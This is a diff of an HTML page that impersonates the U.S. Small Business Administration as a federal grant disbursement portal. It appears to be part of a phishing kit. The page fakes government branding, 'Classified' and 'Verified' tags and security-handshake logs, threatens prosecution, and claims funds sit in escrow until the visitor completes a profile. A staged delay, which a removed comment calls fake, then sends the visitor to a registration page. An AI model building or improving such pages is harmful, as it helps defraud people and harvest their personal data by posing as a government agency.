@@ -3,135 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA | Terms of Federal Compliance</title>
+    <title>SBA | Security & Compliance Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
-        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
-        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; }
-        
-        /* Official Gov Banner */
-        .gov-banner { background: #f0f0f0; font-size: 10px; padding: 4px 20px; border-bottom: 1px solid #ddd; display: flex; align-items: center; gap: 8px; font-weight: 600; }
-        
-        .gov-top { background: #1a1a1a; color: #ffd700; font-size: 9px; padding: 10px; text-align: center; font-weight: 900; letter-spacing: 1.5px; text-transform: uppercase; border-bottom: 4px solid #b69121; }
-        
-        .terms-card { border-radius: 2px; border-top: 8px solid var(--sba-blue); box-shadow: 0 20px 40px rgba(0,0,0,0.1); background: white; }
-        .terms-text { height: 320px; overflow-y: auto; scrollbar-width: thin; padding-right: 15px; border: 1px solid #edf2f7; background: #fafafa; padding: 20px; }
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap');
 
-        .section-h { color: var(--sba-blue); font-weight: 900; margin-top: 25px; border-bottom: 2px solid #e2e8f0; padding-bottom: 5px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        :root { --sba-navy: #001a3d; --sba-blue: #002e6d; --sba-gold: #b69121; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
         
-        .sig-log { 
-            background: #020617; border-radius: 4px; padding: 18px; margin-top: 25px; 
-            font-family: 'JetBrains Mono', 'Courier New', monospace; font-size: 10px; color: #4ade80;
-            line-height: 1.6; border: 1px solid #1e293b; position: relative;
+        .gov-banner { background: #f0f0f0; font-size: 10px; padding: 6px 20px; border-bottom: 1px solid #ddd; display: flex; align-items: center; gap: 8px; font-weight: 700; color: #444; }
+        
+        .auth-header { background: var(--sba-navy); color: #fff; padding: 12px; text-align: center; border-bottom: 4px solid var(--sba-gold); }
+
+        .terms-container { 
+            background: white; 
+            border-radius: 2px; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.1); 
+            border: 1px solid #e2e8f0;
+            position: relative;
         }
-        .sig-log::before { content: "SYSTEM_HANDSHAKE_LOG"; position: absolute; top: -10px; left: 15px; background: #020617; padding: 0 8px; font-size: 9px; color: #94a3b8; }
 
-        .btn-sba { background-color: var(--sba-blue); transition: all 0.3s; }
-        .btn-sba:hover { background-color: #001a3d; transform: translateY(-1px); }
-        .btn-sba:disabled { opacity: 0.6; cursor: not-allowed; }
+        .terms-scroll { 
+            height: 300px; 
+            overflow-y: auto; 
+            background: #f8fafc; 
+            padding: 20px; 
+            border: 1px solid #cbd5e1;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #334155;
+        }
+
+        .legal-tag { background: #fee2e2; color: #991b1b; padding: 2px 8px; border-radius: 2px; font-size: 10px; font-weight: 900; text-transform: uppercase; }
+
+        .console-log { 
+            background: #0f172a; 
+            border-radius: 4px; 
+            padding: 15px; 
+            font-family: 'JetBrains Mono', monospace; 
+            font-size: 10px; 
+            color: #10b981; 
+            border-left: 4px solid #10b981;
+        }
+
+        .btn-action { 
+            background: var(--sba-blue); 
+            color: white; 
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
+            border: none;
+            cursor: pointer;
+        }
+        .btn-action:hover:not(:disabled) { background: var(--sba-navy); transform: translateY(-1px); }
+        .btn-action:active { transform: translateY(0); }
+        .btn-action:disabled { background: #94a3b8; cursor: not-allowed; }
+
+        /* Custom Scrollbar */
+        .terms-scroll::-webkit-scrollbar { width: 6px; }
+        .terms-scroll::-webkit-scrollbar-track { background: #f1f1f1; }
+        .terms-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
-    <!-- Official Flag Header -->
+    <!-- Official Top Bar -->
     <div class="gov-banner">
         <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="U.S. Flag">
-        <span>An official website of the United States government</span>
+        <span class="uppercase tracking-tight">Official Federal Disbursement Portal</span>
     </div>
 
-    <div class="gov-top">
-        <i class="fas fa-lock mr-2"></i> AUTHORIZED PERSONNEL ONLY | ACCESS CODE: SBA-7702-FED
+    <!-- Security Header -->
+    <div class="auth-header">
+        <div class="flex items-center justify-center gap-2">
+            <i class="fas fa-shield-halved text-blue-400"></i>
+            <span class="text-[10px] font-black uppercase tracking-[0.3em]">Secure Handshake Protocol: Active</span>
+        </div>
     </div>
 
-    <main class="flex-grow flex items-center justify-center p-4 md:p-8">
-        <div class="w-full max-w-3xl">
-            <div class="terms-card p-6 md:p-14 border border-slate-200">
+    <main class="flex-grow flex items-center justify-center p-4">
+        <div class="w-full max-w-2xl">
+            <div class="terms-container p-6 md:p-10">
                 
-                <div class="flex justify-between items-start mb-10">
-                    <div class="flex items-center gap-4">
-                        <div class="border-2 border-[#002e6d] p-1 leading-none">
-                            <span class="text-2xl font-black text-[#002e6d]">SBA</span>
-                        </div>
-                        <div>
-                            <p class="text-[8px] font-black text-slate-400 uppercase leading-none mb-1">U.S. Small Business</p>
-                            <p class="text-[11px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
+                <div class="flex flex-col md:flex-row md:items-center justify-between mb-8 gap-4">
+                    <div class="flex items-center gap-3">
+                        <div class="bg-[#002e6d] text-white p-2 font-black text-xl leading-none">SBA</div>
+                        <div class="border-l-2 border-slate-200 pl-3">
+                            <h1 class="text-xs font-black text-slate-500 uppercase leading-none">U.S. Federal</h1>
+                            <h2 class="text-sm font-black text-[#002e6d] uppercase leading-none">Administration</h2>
                         </div>
                     </div>
-                    <div class="text-right">
-                        <span class="bg-blue-50 text-blue-800 px-3 py-1 rounded text-[10px] font-black border border-blue-100 uppercase tracking-tighter">Form 1040-COMP</span>
+                    <div class="flex gap-2">
+                        <span class="legal-tag">Classified</span>
+                        <span class="legal-tag" style="background: #dcfce7; color: #166534;">Verified</span>
                     </div>
                 </div>
 
-                <h2 class="text-3xl font-black text-slate-800 uppercase tracking-tighter mb-2">Legal Compliance & Terms</h2>
-                <p class="text-slate-400 text-[10px] font-bold uppercase tracking-widest mb-6">Last Revised: May 2026</p>
+                <div class="mb-6">
+                    <h3 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Terms of Compliance</h3>
+                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-widest mt-1">Form ID: SBA-TC-2026-BIDA</p>
+                </div>
 
-                <div class="terms-text text-[13px] text-slate-700 leading-relaxed shadow-inner">
-                    <div class="section-h">1.0 LEGAL ATTESTATION</div>
-                    <p class="mt-3">By proceeding, the applicant attests under penalty of perjury that all information provided in this portal is true and accurate. This application is subject to the <b>False Claims Act (31 U.S.C. §§ 3729-3733)</b>.</p>
-
-                    <div class="section-h">2.0 DATA SYNCHRONIZATION</div>
-                    <p class="mt-3">The <b>SBA</b> is authorized to synchronize user-provided PII with the <b>Social Security Administration (SSA)</b> and the <b>Internal Revenue Service (IRS)</b>. This data is used solely to verify eligibility for the requested federal grant funds.</p>
-
-                    <div class="section-h">3.0 ANTI-FRAUD PROTOCOLS</div>
-                    <p class="mt-3">System access is monitored by the <b>Department of Homeland Security (DHS)</b>. Unauthorized access, automated scraping, or identity theft will be prosecuted under <b>18 U.S.C. § 1030</b>. IP addresses and hardware signatures are recorded for every session.</p>
+                <div class="terms-scroll rounded shadow-inner mb-6">
+                    <p class="font-black text-slate-900 mb-2 uppercase text-[11px]">Notice to Applicants:</p>
+                    <p class="mb-4 italic">Failure to strictly adhere to the following federal mandates may result in the immediate suspension of your claim and legal action under the Federal Tort Claims Act.</p>
                     
-                    <div class="section-h">4.0 DISBURSEMENT & HOLDS</div>
-                    <p class="mt-3">Funds will be provisioned in a temporary escrow account. A <b>"PROVISIONAL HOLD"</b> will remain active until the applicant completes the secondary verification process (KYC) within the Secure Dashboard.</p>
+                    <p class="font-bold text-blue-900 uppercase text-[10px] mb-1">1.0 Identity Verification</p>
+                    <p class="mb-4">You authorize the SBA to conduct a background check and PII verification against federal databases. This is a mandatory step for grant disbursement.</p>
+
+                    <p class="font-bold text-blue-900 uppercase text-[10px] mb-1">2.0 Disbursement Escrow</p>
+                    <p class="mb-4">Funds are provisioned to a secure federal escrow. To release these funds, you must complete the Secure Dashboard profile within the specified filing period.</p>
+
+                    <p class="font-bold text-blue-900 uppercase text-[10px] mb-1">3.0 Anti-Fraud Monitoring</p>
+                    <p class="mb-4">All sessions are logged. Unauthorized access or the use of automated scripts is a felony under 18 U.S.C. § 1030. Your IP address and unique hardware ID have been recorded for this session.</p>
                 </div>
 
-                <div class="mt-8 p-5 bg-blue-50 border-l-4 border-[#002e6d] flex gap-4 cursor-pointer hover:bg-blue-100 transition-colors" onclick="document.getElementById('agreeCheck').click()">
-                    <input type="checkbox" id="agreeCheck" class="w-6 h-6 mt-1 accent-[#002e6d]">
-                    <span class="text-[12px] font-bold text-slate-700 uppercase leading-snug">
-                        I hereby accept the federal compliance standards and acknowledge that my digital signature constitutes a legally binding agreement.
-                    </span>
+                <!-- Custom Checkbox Area -->
+                <div class="bg-slate-50 p-4 border border-slate-200 rounded mb-6 group cursor-pointer" onclick="toggleCheck()">
+                    <div class="flex items-start gap-4">
+                        <input type="checkbox" id="mainCheck" class="w-5 h-5 mt-0.5 accent-[#002e6d]">
+                        <span class="text-[11px] font-bold text-slate-600 uppercase leading-relaxed group-hover:text-slate-900 transition-colors">
+                            I acknowledge that I am an authorized legal representative and I agree to the federal compliance standards outlined above.
+                        </span>
+                    </div>
                 </div>
 
-                <div class="sig-log">
-                    [NETWORK_STATUS]: <span class="text-white">ENCRYPTED_LINK_ESTABLISHED</span><br>
-                    [USER_AGENT]: <span id="userAgent" class="text-blue-400">LOADING...</span><br>
-                    [IP_TRACKING]: <span class="text-yellow-500">TRACING_NODE_SUCCESS</span><br>
-                    [TIMESTAMP]: <span id="currentTimestamp" class="text-blue-200">...</span>
+                <!-- Technical Log -->
+                <div class="console-log mb-8">
+                    <div>> INITIALIZING_SECURE_LINK... [OK]</div>
+                    <div>> NODE_ID: <span id="nodeId" class="text-blue-400">...</span></div>
+                    <div>> ENCRYPTION_MODE: AES-256-GCM</div>
+                    <div>> HANDSHAKE_STAMP: <span id="timeLog" class="text-yellow-500">...</span></div>
                 </div>
 
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
-                    <button onclick="handleAgree()" id="agreeBtn" class="btn-sba text-white font-black py-5 rounded-md uppercase tracking-[0.2em] text-[12px] shadow-xl">
-                        Accept & Initialize Profile
+                <!-- Buttons -->
+                <div class="flex flex-col sm:flex-row gap-4">
+                    <button onclick="processAccept()" id="acceptBtn" class="btn-action flex-grow py-5 font-black uppercase tracking-[0.2em] text-[12px] rounded-sm shadow-lg">
+                        Agree & Proceed to Filing
                     </button>
-                    <button onclick="window.history.back()" class="border-2 border-slate-200 text-slate-400 font-black py-5 rounded-md uppercase tracking-[0.2em] text-[12px] hover:bg-slate-50">
-                        Exit Portal
+                    <button onclick="window.location.href='index.html'" class="px-8 py-5 border border-slate-200 text-slate-400 font-bold uppercase tracking-[0.2em] text-[11px] hover:bg-white hover:text-red-500 transition-all rounded-sm">
+                        Decline
                     </button>
                 </div>
+
             </div>
         </div>
     </main>
 
-    <footer class="py-10 text-center">
-         <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[0.3em]">United States Government Property | Unauthorized Use is Prohibited</p>
+    <footer class="py-8 text-center">
+        <p class="text-[9px] text-slate-400 font-black uppercase tracking-[0.4em]">US Government Information System | Authorized Use Only</p>
     </footer>
 
     <script>
-        // Set dynamic log data
-        const now = new Date();
-        document.getElementById('currentTimestamp').innerText = now.toUTCString();
-        document.getElementById('userAgent').innerText = navigator.userAgent.split(') ')[0].substring(0, 40) + "...";
+        // Update Technical Logs
+        document.getElementById('timeLog').innerText = new Date().toISOString().replace('T', ' ').split('.')[0];
+        document.getElementById('nodeId').innerText = 'FED-' + Math.random().toString(36).substr(2, 9).toUpperCase();
 
-        function handleAgree() {
-            const isChecked = document.getElementById('agreeCheck').checked;
+        function toggleCheck() {
+            const ck = document.getElementById('mainCheck');
+            ck.checked = !ck.checked;
+        }
+
+        function processAccept() {
+            const isChecked = document.getElementById('mainCheck').checked;
             if (!isChecked) {
-                alert("FEDERAL REQUIREMENT: You must check the box to acknowledge the terms before proceeding.");
+                alert("FEDERAL REQUIREMENT: Agreement checkbox must be selected.");
                 return;
             }
-            
-            const btn = document.getElementById('agreeBtn');
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> ESTABLISHING HANDSHAKE...';
-            btn.disabled = true;
 
-            // Fake delay to make it look like it's "processing" the agreement
+            const btn = document.getElementById('acceptBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> VERIFYING HANDSHAKE...';
+
             setTimeout(() => {
                 window.location.href = 'register1.html';
-            }, 1500);
+            }, 1200);
         }
     </script>
 </body>
